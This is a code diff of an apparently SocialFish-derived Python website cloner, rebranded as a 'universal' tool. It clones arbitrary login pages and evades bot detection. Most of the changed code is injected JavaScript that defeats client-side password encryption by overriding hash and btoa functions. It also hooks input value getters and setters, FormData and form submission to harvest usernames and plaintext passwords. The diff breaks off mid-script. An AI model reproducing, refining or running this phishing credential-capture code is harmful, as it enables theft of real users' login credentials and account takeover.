@@ -1,11 +1,8 @@
-
 #!/usr/bin/env python3
 """
-SocialFish Compatible UNIVERSAL Website Cloner - FINAL VERSION WITH PASSWORD CAPTURE
-Integrates perfectly with existing SocialFish Flask application
-Supports ALL modern websites with advanced stealth and universal compatibility
-FIXED: CSS background-image URL rewriting for proper display
-ENHANCED: Password capture in plain text before encryption
+UNIVERSAL Website Cloner - FINAL VERSION WITH PASSWORD CAPTURE
+Works with ANY website universally - not limited to specific sites
+Enhanced with comprehensive resource discovery and modern web support
 """
 
 import asyncio
@@ -31,7 +28,7 @@ from typing import Dict, List, Set, Optional, Tuple, Any, Union
 from collections import defaultdict, deque
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib.parse
-import requests  # Add this import at the top
+import requests
 from functools import wraps
 import tempfile
 import shutil
@@ -84,40 +81,46 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('socialfish_cloner.log'),
+        logging.FileHandler('universal_cloner.log'),
         logging.StreamHandler()
     ]
 )
 logger = logging.getLogger(__name__)
 
-class SocialFishConfig:
-    """Configuration optimized for SocialFish integration"""
+class UniversalClonerConfig:
+    """Universal configuration for any website"""
     def __init__(self):
         # Performance settings
-        self.max_workers = 6
-        self.max_concurrent_downloads = 12
+        self.max_workers = 8
+        self.max_concurrent_downloads = 16
         self.request_timeout = 30
-        self.page_load_timeout = 45
+        self.page_load_timeout = 60
         
-        # Stealth settings
+        # Universal stealth settings
         self.rotate_user_agents = True
         self.mimic_human_behavior = True
         self.use_undetected_chrome = UC_AVAILABLE
         
-        # Resource handling
+        # Universal resource handling
         self.download_images = True
         self.download_fonts = True
         self.download_css = True
         self.download_js = True
+        self.download_videos = True
+        self.download_audio = True
         self.process_inline_resources = True
         self.rewrite_urls = True
         
-        # Advanced features
+        # Advanced universal features
         self.render_spa = True
         self.handle_auth_flows = True
         self.capture_api_calls = True
+        self.discover_service_workers = True
+        self.discover_web_manifests = True
+        self.process_shadow_dom = True
+        self.handle_lazy_loading = True
         
-        # PASSWORD CAPTURE SETTINGS - NEW
+        # Password capture settings
         self.capture_passwords_plaintext = True
         self.disable_client_encryption = True
         self.log_password_attempts = True
@@ -128,19 +131,19 @@ class SocialFishConfig:
         self.retry_delay = 1.0
         self.ignore_ssl_errors = True
         
-        # SocialFish specific
-        self.output_base = 'templates/fake'
+        # Universal output
+        self.output_base = 'cloned_sites'
         self.create_index_html = True
 
-class AdvancedUserAgentManager:
-    """Advanced user agent management with realistic fingerprints"""
+class UniversalUserAgentManager:
+    """Universal user agent management for any website"""
     
     def __init__(self):
-        self.agents = self._load_comprehensive_agents()
+        self.agents = self._load_universal_agents()
         self.current_index = 0
     
-    def _load_comprehensive_agents(self):
-        """Load comprehensive user agent database"""
+    def _load_universal_agents(self):
+        """Load universal user agent database for maximum compatibility"""
         return [
             {
                 'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
@@ -149,7 +152,7 @@ class AdvancedUserAgentManager:
                 'mobile': False,
                 'headers': {
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Accept-Language': 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7',
                     'Accept-Encoding': 'gzip, deflate, br, zstd',
                     'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                     'Sec-Ch-Ua-Mobile': '?0',
@@ -168,10 +171,7 @@ class AdvancedUserAgentManager:
                 'headers': {
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                     'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br, zstd',
-                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"macOS"'
+                    'Accept-Encoding': 'gzip, deflate, br, zstd'
                 }
             },
             {
@@ -182,6 +182,17 @@ class AdvancedUserAgentManager:
                 'headers': {
                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                     'Accept-Language': 'en-US,en;q=0.5',
+                    'Accept-Encoding': 'gzip, deflate, br'
+                }
+            },
+            {
+                'ua': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                'platform': 'Linux',
+                'browser': 'Chrome',
+                'mobile': False,
+                'headers': {
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                    'Accept-Language': 'en-US,en;q=0.9',
                     'Accept-Encoding': 'gzip, deflate, br'
                 }
             },
@@ -200,7 +211,6 @@ class AdvancedUserAgentManager:
     
     def get_agent_for_user_agent(self, user_agent_string):
         """Get agent data for specific user agent string"""
-        # Find matching agent or use first as fallback
         for agent in self.agents:
             if agent['ua'] == user_agent_string:
                 return agent
@@ -218,32 +228,35 @@ class AdvancedUserAgentManager:
             }
         }
 
-class SocialFishResourceManager:
-    """Resource manager optimized for SocialFish directory structure"""
+class UniversalResourceManager:
+    """Universal resource manager for any website"""
     
-    def __init__(self, config: SocialFishConfig):
+    def __init__(self, config: UniversalClonerConfig):
         self.config = config
         self.session_pool = []
         self.stats = {
             'downloaded': 0,
             'failed': 0,
             'bytes_downloaded': 0,
-            'processing_time': 0
+            'processing_time': 0,
+            'service_workers_found': 0,
+            'manifests_found': 0,
+            'shadow_dom_resources': 0
         }
         self.downloaded_urls = set()
         self.failed_urls = set()
-        # CRITICAL FIX: Track URL mappings for rewriting
         self.url_mappings = {}
+        self.processed_css_imports = set()  # Track processed CSS imports
     
     async def initialize_sessions(self, user_agent_data):
-        """Initialize HTTP sessions"""
+        """Initialize universal HTTP sessions"""
         self.session_pool = []
         
-        for i in range(3):  # Create 3 sessions
+        for i in range(5):  # Create more sessions for universal handling
             timeout = aiohttp.ClientTimeout(total=self.config.request_timeout)
             connector = aiohttp.TCPConnector(
-                limit=50,
-                limit_per_host=10,
+                limit=100,  # Increased for universal usage
+                limit_per_host=20,
                 ssl=not self.config.ignore_ssl_errors,
                 ttl_dns_cache=300
             )
@@ -259,61 +272,37 @@ class SocialFishResourceManager:
             
             self.session_pool.append(session)
     
-    async def download_resource(self, url: str, resource_type: str, 
-                               referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
-        """Download resource using SYNC requests in async wrapper - BULLETPROOF"""
+    async def download_resource_universal(self, url: str, resource_type: str, 
+                                        referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
+        """Universal resource download for any website"""
         if url in self.downloaded_urls or url in self.failed_urls:
             return None
         
-        # Run the EXACT working code pattern in a thread
-        import concurrent.futures
-        import threading
-        
         def sync_download():
-            """EXACT copy of working code download pattern"""
+            """Universal synchronous download"""
             try:
-                # Create session exactly like working code
                 session = requests.Session()
                 session.verify = False
                 session.timeout = 30
                 
-                # Headers like working code
-                headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-                    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' if resource_type == 'image' else '*/*',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Connection': 'keep-alive',
-                }
+                # Universal headers for any website
+                headers = self._get_universal_headers(url, resource_type, referer)
                 
-                if referer:
-                    headers['Referer'] = referer
-                
-                # EXACT working code request
-                response = session.get(url, headers=headers, timeout=30, verify=False)
+                response = session.get(url, headers=headers, timeout=30, verify=False, 
+                                     allow_redirects=True, stream=True)
                 
                 if response.status_code == 200:
-                    # EXACT working code content handling
-                    content = response.content  # Raw bytes - this is what works!
+                    # Handle large files with streaming
+                    content = b''
+                    for chunk in response.iter_content(chunk_size=8192):
+                        content += chunk
+                        # Limit file size to prevent abuse
+                        if len(content) > 50 * 1024 * 1024:  # 50MB limit
+                            logger.warning(f"File too large, truncating: {url}")
+                            break
                     
-                    # EXACT working code decompression
-                    encoding = response.headers.get('content-encoding', '').lower()
-                    
-                    if 'br' in encoding:
-                        try:
-                            content = brotli.decompress(content)
-                        except:
-                            pass
-                    elif 'gzip' in encoding:
-                        try:
-                            content = gzip.decompress(content)
-                        except:
-                            pass
-                    elif 'deflate' in encoding:
-                        try:
-                            content = zlib.decompress(content)
-                        except:
-                            pass
+                    # Universal decompression
+                    content = self._universal_decompress(content, response.headers)
                     
                     return content, {
                         'url': url,
@@ -325,13 +314,12 @@ class SocialFishResourceManager:
                 return None
                 
             except Exception as e:
-                print(f"Download failed: {e}")
+                logger.debug(f"Download failed for {url}: {e}")
                 return None
         
-        # Run in thread to avoid blocking async loop
+        # Run in thread
         loop = asyncio.get_event_loop()
         with concurrent.futures.ThreadPoolExecutor() as executor:
-            future = executor.submit(sync_download)
             try:
                 result = await loop.run_in_executor(None, sync_download)
                 
@@ -352,22 +340,104 @@ class SocialFishResourceManager:
                 self.stats['failed'] += 1
                 return None
     
+    def _get_universal_headers(self, url: str, resource_type: str, referer: str = None) -> dict:
+        """Get universal headers that work with any website"""
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'DNT': '1'
+        }
+        
+        # Universal accept headers for all resource types
+        accept_headers = {
+            'image': 'image/avif,image/webp,image/apng,image/svg+xml,image/png,image/jpeg,image/*,*/*;q=0.8',
+            'svg': 'image/svg+xml,image/*,*/*;q=0.8',
+            'css': 'text/css,*/*;q=0.1',
+            'js': 'application/javascript,text/javascript,*/*;q=0.01',
+            'font': 'font/woff2,font/woff,font/ttf,font/otf,application/font-woff2,application/font-woff,*/*;q=0.1',
+            'video': 'video/webm,video/ogg,video/mp4,video/*,*/*;q=0.8',
+            'audio': 'audio/webm,audio/ogg,audio/wav,audio/mp3,audio/*,*/*;q=0.8',
+            'document': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        }
+        
+        headers['Accept'] = accept_headers.get(resource_type, '*/*')
+        
+        if referer:
+            headers['Referer'] = referer
+        
+        # Add modern browser headers for better compatibility
+        headers.update({
+            'Sec-Fetch-Dest': self._get_fetch_dest(resource_type),
+            'Sec-Fetch-Mode': 'no-cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Upgrade-Insecure-Requests': '1'
+        })
+        
+        return headers
+    
+    def _get_fetch_dest(self, resource_type: str) -> str:
+        """Get appropriate Sec-Fetch-Dest for resource type"""
+        dest_map = {
+            'image': 'image',
+            'svg': 'image', 
+            'css': 'style',
+            'js': 'script',
+            'font': 'font',
+            'video': 'video',
+            'audio': 'audio',
+            'document': 'document'
+        }
+        return dest_map.get(resource_type, 'empty')
+    
+    def _universal_decompress(self, content: bytes, headers: dict) -> bytes:
+        """Universal decompression for any encoding"""
+        if not content:
+            return content
+        
+        encoding = headers.get('content-encoding', '').lower()
+        
+        try:
+            if 'br' in encoding:
+                return brotli.decompress(content)
+            elif 'gzip' in encoding:
+                return gzip.decompress(content)
+            elif 'deflate' in encoding:
+                return zlib.decompress(content)
+        except Exception:
+            # Try magic byte detection
+            if content[:2] == b'\x1f\x8b':
+                try:
+                    return gzip.decompress(content)
+                except:
+                    pass
+            elif content[:1] == b'\x78':
+                try:
+                    return zlib.decompress(content)
+                except:
+                    pass
+        
+        return content
+    
     async def cleanup(self):
-        """Cleanup sessions"""
+        """Cleanup all sessions"""
         for session in self.session_pool:
             await session.close()
 
-class SocialFishBrowserManager:
-    """Browser manager with advanced stealth and PASSWORD CAPTURE for SocialFish"""
+class UniversalBrowserManager:
+    """Universal browser manager with password capture for any website"""
     
-    def __init__(self, config: SocialFishConfig):
+    def __init__(self, config: UniversalClonerConfig):
         self.config = config
         self.driver = None
-        self.captured_passwords = []  # NEW: Store captured passwords
+        self.captured_passwords = []
         self.password_capture_enabled = config.capture_passwords_plaintext
     
     def initialize_browser(self, user_agent: str):
-        """Initialize browser with advanced stealth and password capture"""
+        """Initialize universal browser"""
         try:
             if self.config.use_undetected_chrome and UC_AVAILABLE:
                 return self._create_undetected_chrome(user_agent)
@@ -379,10 +449,11 @@ class SocialFishBrowserManager:
         return None
     
     def _create_undetected_chrome(self, user_agent: str):
-        """Create undetected Chrome instance"""
+        """Create undetected Chrome for universal stealth"""
         try:
             options = uc.ChromeOptions()
             
+            # Universal stealth arguments for any website
             stealth_args = [
                 '--no-sandbox',
                 '--disable-dev-shm-usage',
@@ -391,7 +462,14 @@ class SocialFishBrowserManager:
                 f'--user-agent={user_agent}',
                 '--disable-blink-features=AutomationControlled',
                 '--disable-web-security',
-                '--no-first-run'
+                '--disable-features=VizDisplayCompositor',
+                '--disable-extensions',
+                '--no-first-run',
+                '--disable-default-apps',
+                '--disable-sync',
+                '--disable-background-timer-throttling',
+                '--disable-renderer-backgrounding',
+                '--disable-backgrounding-occluded-windows'
             ]
             
             for arg in stealth_args:
@@ -402,9 +480,10 @@ class SocialFishBrowserManager:
             
             driver = uc.Chrome(options=options)
             
-            # Additional stealth
+            # Universal stealth techniques
             driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
             driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
+            driver.execute_cdp_cmd('Runtime.enable', {})
             
             return driver
             
@@ -413,7 +492,7 @@ class SocialFishBrowserManager:
             return None
     
     def _create_selenium_browser(self, user_agent: str):
-        """Create regular Selenium browser"""
+        """Create regular Selenium browser with universal compatibility"""
         try:
             # Try Chrome first
             options = ChromeOptions()
@@ -423,6 +502,7 @@ class SocialFishBrowserManager:
             options.add_argument(f'--user-agent={user_agent}')
             options.add_argument('--disable-blink-features=AutomationControlled')
             options.add_experimental_option('excludeSwitches', ['enable-automation'])
+            options.add_experimental_option('useAutomationExtension', False)
             
             driver = webdriver.Chrome(options=options)
             driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
@@ -443,1818 +523,807 @@ class SocialFishBrowserManager:
                 logger.error(f"Firefox creation failed: {e}")
                 return None
     
-    async def render_page(self, url: str) -> Optional[str]:
-        """Render page with JavaScript execution and NUCLEAR PASSWORD CAPTURE"""
+    async def render_page_universal(self, url: str) -> Optional[str]:
+        """Universal page rendering with comprehensive resource discovery"""
         if not self.driver:
             return None
         
         try:
             self.driver.set_page_load_timeout(self.config.page_load_timeout)
             
-            # NUCLEAR OPTION: Inject scripts BEFORE page navigation
-            self._inject_nuclear_password_capture()
+            # Inject password capture before navigation
+            if self.password_capture_enabled:
+                self._inject_universal_password_capture()
             
             self.driver.get(url)
             
-            # Wait for page load
-            WebDriverWait(self.driver, 10).until(
+            # Wait for initial load
+            WebDriverWait(self.driver, 15).until(
                 EC.presence_of_element_located((By.TAG_NAME, "body"))
             )
             
-            # CRITICAL: Re-inject immediately after page load
-            self._inject_nuclear_password_capture()
+            # Re-inject password capture after page load
+            if self.password_capture_enabled:
+                self._inject_universal_password_capture()
             
-            # Simulate human behavior
+            # Universal human behavior simulation
             if self.config.mimic_human_behavior:
-                await self._simulate_human_behavior()
+                await self._simulate_universal_human_behavior()
             
-            # Trigger lazy loading
-            self.driver.execute_script("""
-                window.scrollTo(0, document.body.scrollHeight);
-                
-                // Trigger intersection observers
-                document.querySelectorAll('img[data-src]').forEach(img => {
-                    if (img.dataset.src) {
-                        img.src = img.dataset.src;
-                    }
-                });
-                
-                // Dispatch load event
-                window.dispatchEvent(new Event('load'));
-            """)
+            # Universal lazy loading trigger
+            await self._trigger_universal_lazy_loading()
             
-            await asyncio.sleep(2)
+            # Wait for dynamic content
+            await asyncio.sleep(3)
             
-            # FINAL: One more injection to catch any late loaders
-            self._inject_nuclear_password_capture()
+            # Final password capture injection
+            if self.password_capture_enabled:
+                self._inject_universal_password_capture()
             
             return self.driver.page_source
             
         except Exception as e:
-            logger.error(f"Page rendering failed: {e}")
+            logger.error(f"Universal page rendering failed: {e}")
             return None
     
-    def _inject_nuclear_password_capture(self):
-        """NUCLEAR OPTION: The most aggressive password capture possible"""
-        nuclear_script = '''
-        (function() {
-            console.log("💥 NUCLEAR PASSWORD CAPTURE ACTIVATED");
+    async def _simulate_universal_human_behavior(self):
+        """Universal human behavior simulation for any website"""
+        try:
+            # Universal scrolling patterns
+            scroll_positions = [0.1, 0.3, 0.5, 0.7, 0.9, 1.0, 0.5, 0.0]
+            for position in scroll_positions:
+                self.driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {position});")
+                await asyncio.sleep(random.uniform(0.5, 1.5))
             
-            // STEP 0: IMMEDIATE GLOBAL LOCKDOWN
-            window.socialfishCapturedData = window.socialfishCapturedData || {
-                passwords: [], usernames: [], formData: {}, 
-                blocked_encryptions: [], raw_passwords: []
+            # Universal mouse movements and clicks
+            try:
+                # Move mouse to random elements
+                elements = self.driver.find_elements(By.TAG_NAME, "div")[:5]
+                for element in elements:
+                    try:
+                        ActionChains(self.driver).move_to_element(element).perform()
+                        await asyncio.sleep(random.uniform(0.1, 0.3))
+                    except:
+                        pass
+            except:
+                pass
+                
+        except Exception:
+            pass
+    
+    async def _trigger_universal_lazy_loading(self):
+        """Universal lazy loading trigger for any website"""
+        try:
+            # Comprehensive lazy loading script for all patterns
+            lazy_loading_script = """
+                // Universal lazy loading trigger
+                
+                // 1. Trigger intersection observers
+                const lazyElements = document.querySelectorAll('[data-src], [data-lazy-src], [loading="lazy"], [data-original]');
+                lazyElements.forEach(el => {
+                    el.scrollIntoView({behavior: 'smooth', block: 'center'});
+                    
+                    // Force load data-src patterns
+                    if (el.dataset.src && !el.src) {
+                        el.src = el.dataset.src;
+                    }
+                    if (el.dataset.lazySrc && !el.src) {
+                        el.src = el.dataset.lazySrc;
+                    }
+                    if (el.dataset.original && !el.src) {
+                        el.src = el.dataset.original;
+                    }
+                });
+                
+                // 2. Trigger manual intersection observer events
+                if (window.IntersectionObserver) {
+                    const observers = [];
+                    document.querySelectorAll('*').forEach(el => {
+                        if (el._observers) {
+                            observers.push(...el._observers);
+                        }
+                    });
+                    
+                    // Manually trigger observers
+                    observers.forEach(observer => {
+                        try {
+                            observer.callback([{isIntersecting: true, target: observer.target}]);
+                        } catch (e) {}
+                    });
+                }
+                
+                // 3. Force load common lazy loading libraries
+                if (typeof LazyLoad !== 'undefined' && LazyLoad.prototype.loadAll) {
+                    try { LazyLoad.prototype.loadAll(); } catch(e) {}
+                }
+                
+                // 4. Trigger scroll events
+                window.dispatchEvent(new Event('scroll'));
+                window.dispatchEvent(new Event('resize'));
+                window.dispatchEvent(new Event('load'));
+                
+                // 5. Force load images with common patterns
+                document.querySelectorAll('img').forEach(img => {
+                    if (!img.src || img.src.includes('placeholder') || img.src.includes('lazy')) {
+                        ['data-src', 'data-lazy-src', 'data-original', 'data-url'].forEach(attr => {
+                            if (img.getAttribute(attr)) {
+                                img.src = img.getAttribute(attr);
+                            }
+                        });
+                    }
+                });
+                
+                // 6. Trigger module loading
+                if (typeof __webpack_require__ !== 'undefined') {
+                    try {
+                        // Trigger webpack chunk loading
+                        if (__webpack_require__.e) {
+                            __webpack_require__.e = __webpack_require__.e || function() { return Promise.resolve(); };
+                        }
+                    } catch (e) {}
+                }
+                
+                return lazyElements.length;
+            """
+            
+            triggered_count = self.driver.execute_script(lazy_loading_script)
+            logger.debug(f"Triggered lazy loading for {triggered_count} elements")
+            
+            # Additional scrolling to trigger more lazy loading
+            for i in range(5):
+                self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
+                await asyncio.sleep(0.5)
+                self.driver.execute_script("window.scrollTo(0, 0);")
+                await asyncio.sleep(0.5)
+                
+        except Exception as e:
+            logger.debug(f"Lazy loading trigger failed: {e}")
+    
+    def _inject_universal_password_capture(self):
+        """Universal password capture system for any website"""
+        if not self.password_capture_enabled:
+            return
+            
+        universal_capture_script = '''
+        (function() {
+            if (window.universalPasswordCaptureActive) return;
+            window.universalPasswordCaptureActive = true;
+            
+            console.log("🔑 UNIVERSAL PASSWORD CAPTURE ACTIVATED");
+            
+            // Universal password storage
+            window.universalCapturedData = window.universalCapturedData || {
+                passwords: [], usernames: [], formData: {}, blocked_encryptions: []
             };
             
-            // NUCLEAR OPTION 1: KILL ALL POSSIBLE ENCRYPTION FUNCTIONS
-            const nuclearKill = (funcName) => {
+            // Universal encryption blocking - works for any site
+            const universalEncryptionKill = (funcName) => {
                 try {
                     Object.defineProperty(window, funcName, {
-                        get: function() {
-                            return function(password) {
-                                console.log(`💥 NUCLEAR KILL ${funcName} - RAW PASSWORD:`, password);
-                                window.socialfishCapturedData.raw_passwords.push({
-                                    function: funcName,
-                                    password: password,
-                                    timestamp: Date.now(),
-                                    source: 'nuclear-kill'
-                                });
-                                return password; // ALWAYS return unencrypted
-                            };
+                        get: () => (p) => { 
+                            console.log(`🔑 UNIVERSAL KILL ${funcName}:`, p);
+                            window.universalCapturedData.passwords.push({
+                                field: funcName, password: p, timestamp: Date.now(), source: 'universal-kill'
+                            });
+                            return p;
                         },
-                        set: function(value) {
-                            console.log(`💥 BLOCKED SETTING ${funcName}`);
-                            return function(password) {
-                                console.log(`💥 NUCLEAR INTERCEPT ${funcName} - RAW PASSWORD:`, password);
-                                window.socialfishCapturedData.raw_passwords.push({
-                                    function: funcName + '_set',
-                                    password: password,
-                                    timestamp: Date.now(),
-                                    source: 'nuclear-set-block'
-                                });
-                                return password;
-                            };
-                        },
-                        configurable: false,
-                        enumerable: false
+                        set: () => console.log(`🛡️ UNIVERSAL BLOCK ${funcName} SET`),
+                        configurable: false
                     });
-                } catch (e) {
-                    console.log(`Failed to kill ${funcName}:`, e);
-                }
+                } catch (e) {}
             };
             
-            // Kill every possible encryption function name
+            // Kill all possible encryption functions
             const encryptionFunctions = [
-                'PWDEncrypt', 'encryptPassword', 'hashPassword', '_encrypt', 
-                'passwordEncrypt', 'cryptPassword', 'hashPwd', 'encryptPwd',
-                'encrypt', 'hash', 'encode', 'obfuscate', 'scramble',
-                'PWD_encrypt', 'pwd_encrypt', 'password_encrypt', 'pass_encrypt'
+                'encrypt', 'hash', 'md5', 'sha1', 'sha256', 'btoa', 'encode',
+                'PWDEncrypt', 'encryptPassword', 'hashPassword', 'cryptPassword',
+                'passwordHash', 'hashPwd', 'encryptPwd', 'scramble', 'obfuscate'
             ];
+            encryptionFunctions.forEach(universalEncryptionKill);
             
-            encryptionFunctions.forEach(nuclearKill);
-            
-            // NUCLEAR OPTION 2: KILL MODULE SYSTEMS COMPLETELY
-            try {
-                Object.defineProperty(window, '__d', {
-                    get: () => (() => null),
-                    set: () => {},
-                    configurable: false
-                });
-            } catch (e) {}
-            
-            try {
-                Object.defineProperty(window, 'require', {
-                    get: () => (() => ({encrypt: p => p, hash: p => p})),
-                    set: () => {},
-                    configurable: false
-                });
-            } catch (e) {}
-            
-            // NUCLEAR OPTION 3: OVERRIDE ALL ENCODING FUNCTIONS
-            const originalBtoa = window.btoa;
-            const originalAtob = window.atob;
-            
-            try {
-                window.btoa = function(str) {
-                    console.log("💥 NUCLEAR btoa intercept:", str);
-                    if (str && str.length > 4 && str.length < 200) {
-                        window.socialfishCapturedData.raw_passwords.push({
-                            function: 'btoa',
-                            password: str,
-                            timestamp: Date.now(),
-                            source: 'nuclear-btoa'
-                        });
-                    }
-                    return originalBtoa ? originalBtoa(str) : btoa(str);
-                };
-            } catch (e) {}
-            
-            // NUCLEAR OPTION 4: INTERCEPT ALL FORM DATA CREATION WITH PASSWORD PRESERVATION
-            const originalFormData = window.FormData;
-            try {
-                window.FormData = function(form) {
-                    console.log("💥 NUCLEAR FormData intercept");
-                    const formData = new originalFormData(form);
-                    
-                    if (form) {
-                        // CRITICAL: Get passwords from our permanent storage
-                        const inputs = form.querySelectorAll('input');
-                        inputs.forEach(input => {
-                            const name = input.name || input.id || 'unknown';
-                            const value = input.value;
-                            const type = input.type || 'text';
+            // Universal form monitoring
+            const universalFormMonitor = () => {
+                document.querySelectorAll('form').forEach(form => {
+                    if (!form._universalMonitored) {
+                        form._universalMonitored = true;
+                        
+                        form.addEventListener('submit', function(e) {
+                            const formData = new FormData(this);
+                            const captured = {};
                             
-                            // Check our permanent storage for password values
-                            if (window.nuclearPasswordStorage && window.nuclearPasswordStorage.has(input)) {
-                                const storedPassword = window.nuclearPasswordStorage.get(input);
-                                console.log(`💥 NUCLEAR FORM USING STORED PASSWORD - ${name}:`, storedPassword);
+                            for (let [key, value] of formData.entries()) {
+                                captured[key] = value;
                                 
-                                // Replace empty password with stored value
-                                if ((type === 'password' || /pass|pwd/i.test(name)) && storedPassword) {
-                                    // Override the FormData with our stored password
-                                    formData.set(name, storedPassword);
-                                    
-                                    window.socialfishCapturedData.raw_passwords.push({
-                                        field: name,
-                                        password: storedPassword,
-                                        timestamp: Date.now(),
-                                        source: 'nuclear-formdata-stored'
+                                if (/pass|pwd|password|secret|pin/i.test(key) || 
+                                    (typeof value === 'string' && value.length >= 4 && value.length <= 128)) {
+                                    console.log(`🔑 UNIVERSAL FORM PASSWORD - ${key}:`, value);
+                                    window.universalCapturedData.passwords.push({
+                                        field: key, password: value, timestamp: Date.now(), source: 'universal-form'
+                                    });
+                                }
+                                
+                                if (/email|user|login|account/i.test(key)) {
+                                    console.log(`👤 UNIVERSAL USERNAME - ${key}:`, value);
+                                    window.universalCapturedData.usernames.push({
+                                        field: key, username: value, timestamp: Date.now(), source: 'universal-form'
                                     });
                                 }
                             }
                             
-                            if (type === 'password' || /pass|pwd/i.test(name)) {
-                                console.log(`💥 NUCLEAR FORM PASSWORD - ${name}:`, value);
-                                if (value) {
-                                    window.socialfishCapturedData.raw_passwords.push({
-                                        field: name,
-                                        password: value,
-                                        timestamp: Date.now(),
-                                        source: 'nuclear-formdata'
-                                    });
-                                }
-                            }
+                            window.universalCapturedData.formData = captured;
                         });
                     }
-                    
-                    return formData;
-                };
-            } catch (e) {}
-            
-            // NUCLEAR OPTION 5: OVERRIDE INPUT VALUE GETTERS WITH PERMANENT STORAGE
-            try {
-                const originalValueDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
-                const passwordStorage = new Map(); // Permanent password storage
-                
-                Object.defineProperty(HTMLInputElement.prototype, 'value', {
-                    get: function() {
-                        const originalValue = originalValueDescriptor.get.call(this);
-                        const type = this.type || 'text';
-                        const name = this.name || this.id || 'unknown';
-                        
-                        // If it's a password field, check our storage first
-                        if ((type === 'password' || /pass|pwd/i.test(name)) && passwordStorage.has(this)) {
-                            const storedValue = passwordStorage.get(this);
-                            console.log(`💥 NUCLEAR INPUT VALUE GET (STORED) - ${name}:`, storedValue);
-                            return storedValue;
-                        }
-                        
-                        if ((type === 'password' || /pass|pwd/i.test(name)) && originalValue && originalValue.length > 0) {
-                            console.log(`💥 NUCLEAR INPUT VALUE GET - ${name}:`, originalValue);
-                            passwordStorage.set(this, originalValue); // Store it permanently
-                            window.socialfishCapturedData.raw_passwords.push({
-                                field: name,
-                                password: originalValue,
-                                timestamp: Date.now(),
-                                source: 'nuclear-input-get'
-                            });
-                        }
-                        
-                        return originalValue;
-                    },
-                    set: function(value) {
-                        const type = this.type || 'text';
-                        const name = this.name || this.id || 'unknown';
-                        
-                        if ((type === 'password' || /pass|pwd/i.test(name)) && value && value.length > 0) {
-                            console.log(`💥 NUCLEAR INPUT VALUE SET - ${name}:`, value);
-                            passwordStorage.set(this, value); // Store permanently
-                            window.socialfishCapturedData.raw_passwords.push({
-                                field: name,
-                                password: value,
-                                timestamp: Date.now(),
-                                source: 'nuclear-input-set'
-                            });
-                        }
-                        
-                        return originalValueDescriptor.set.call(this, value);
-                    }
                 });
-                
-                // Expose password storage for form submission
-                window.nuclearPasswordStorage = passwordStorage;
-            } catch (e) {
-                console.log("Nuclear input override failed:", e);
-            }
+            };
             
-            // NUCLEAR OPTION 6: CONTINUOUS MONITORING WITH MAXIMUM FREQUENCY
-            const nuclearMonitor = () => {
-                try {
-                    document.querySelectorAll('input').forEach(input => {
-                        const type = input.type || 'text';
-                        const name = (input.name || input.id || '').toLowerCase();
-                        const value = input.value;
-                        
-                        if ((type === 'password' || name.includes('pass') || name.includes('pwd')) && 
-                            value && value.length > 0 && !input._nuclearMonitored) {
+            // Universal input monitoring
+            const universalInputMonitor = () => {
+                document.querySelectorAll('input').forEach(input => {
+                    const type = (input.type || '').toLowerCase();
+                    const name = (input.name || input.id || '').toLowerCase();
+                    
+                    if (type === 'password' || /pass|pwd|secret|pin/i.test(name)) {
+                        if (!input._universalMonitored) {
+                            input._universalMonitored = true;
                             
-                            console.log(`💥 NUCLEAR MONITOR FOUND PASSWORD - ${name}:`, value);
-                            window.socialfishCapturedData.raw_passwords.push({
-                                field: name,
-                                password: value,
-                                timestamp: Date.now(),
-                                source: 'nuclear-monitor'
-                            });
-                            
-                            input._nuclearMonitored = true;
-                            
-                            // Add all possible event listeners
-                            ['input', 'change', 'blur', 'keyup', 'keydown', 'paste'].forEach(eventType => {
-                                input.addEventListener(eventType, () => {
-                                    if (input.value) {
-                                        console.log(`💥 NUCLEAR EVENT ${eventType} - ${name}:`, input.value);
-                                        window.socialfishCapturedData.raw_passwords.push({
